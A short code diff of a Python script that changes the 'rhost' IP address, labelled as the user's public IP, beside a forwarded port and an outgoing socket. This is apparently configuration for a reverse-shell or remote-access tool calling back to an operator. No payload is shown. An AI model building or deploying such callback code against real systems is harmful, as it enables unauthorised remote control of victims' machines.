@@ -10,7 +10,7 @@ import platform
 import requests
 def __main__():
 	try:
-		rhost = '192.168.0.106' # Your PUBLIC IP
+		rhost = '192.168.0.100' # Your PUBLIC IP
 		rport = 5731 # Forwarded Port
 		clport = 5732
 		cl = socket.socket()
